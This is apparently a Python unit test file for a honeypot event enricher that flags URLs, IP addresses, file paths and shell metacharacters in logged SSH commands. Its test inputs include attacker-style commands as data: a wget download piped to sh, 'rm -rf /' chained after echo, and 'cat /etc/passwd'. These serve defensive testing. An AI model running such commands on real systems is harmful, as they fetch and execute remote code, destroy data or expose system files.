"""Isolated unit tests for EventEnricher.

Uses directly constructed AttackEvent / ProcessedEvent objects.
Requires no Cowrie, no Docker, no network, no database, no real log
files, and no other external services.
"""

from core.event_engine.event import AttackEvent
from core.log_processor.enricher import EventEnricher
from core.log_processor.processor import ProcessedEvent


def _make_processed_event(command: str) -> ProcessedEvent:
    event = AttackEvent(
        timestamp="2026-08-12T14:20:00.123456Z",
        source_ip="127.0.0.1",
        session_id="session001",
        protocol="ssh",
        command=command,
        event_type="cowrie.command.input",
        honeypot="Cowrie",
    )
    return ProcessedEvent(
        original_event=event,
        event_type=event.event_type,
        normalized_command=command,
        category="command_execution",
        severity="low",
    )


def test_empty_command_produces_has_command_false():
    enriched = EventEnricher().enrich(_make_processed_event(""))
    assert enriched.has_command is False


def test_pwd_produces_has_command_true():
    enriched = EventEnricher().enrich(_make_processed_event("pwd"))
    assert enriched.has_command is True


def test_command_length_is_correct():
    enriched = EventEnricher().enrich(_make_processed_event("pwd"))
    assert enriched.command_length == 3


def test_http_url_is_detected():
    enriched = EventEnricher().enrich(_make_processed_event("wget http://example.com/a.sh"))
    assert enriched.has_url is True


def test_https_url_is_detected():
    enriched = EventEnricher().enrich(_make_processed_event("curl https://example.com"))
    assert enriched.has_url is True


def test_ipv4_address_is_detected():
    enriched = EventEnricher().enrich(_make_processed_event("ping 192.168.1.10"))
    assert enriched.has_ip_address is True


def test_unix_file_path_is_detected():
    enriched = EventEnricher().enrich(_make_processed_event("cat /etc/passwd"))
    assert enriched.has_file_path is True


def test_shell_metacharacters_are_detected():
    enriched = EventEnricher().enrich(_make_processed_event("echo hi; rm -rf /"))
    assert enriched.has_shell_metacharacters is True


def test_command_with_no_features_returns_false_values():
    enriched = EventEnricher().enrich(_make_processed_event("pwd"))
    assert enriched.has_url is False
    assert enriched.has_ip_address is False
    assert enriched.has_file_path is False
    assert enriched.has_shell_metacharacters is False


def test_processed_event_is_preserved_unchanged():
    processed = _make_processed_event("pwd")
    enriched = EventEnricher().enrich(processed)

    assert enriched.processed_event is processed
    assert enriched.processed_event.normalized_command == "pwd"
    assert enriched.processed_event.category == "command_execution"
    assert enriched.processed_event.severity == "low"


def test_combined_command_can_produce_multiple_features():
    enriched = EventEnricher().enrich(
        _make_processed_event("wget http://1.2.3.4/a.sh -O- | sh")
    )
    assert enriched.has_url is True
    assert enriched.has_ip_address is True
    assert enriched.has_shell_metacharacters is True


def test_non_command_event_keeps_all_command_derived_features_false():
    enriched = EventEnricher().enrich(_make_processed_event(""))
    assert enriched.has_command is False
    assert enriched.command_length == 0
    assert enriched.has_url is False
    assert enriched.has_ip_address is False
    assert enriched.has_file_path is False
    assert enriched.has_shell_metacharacters is False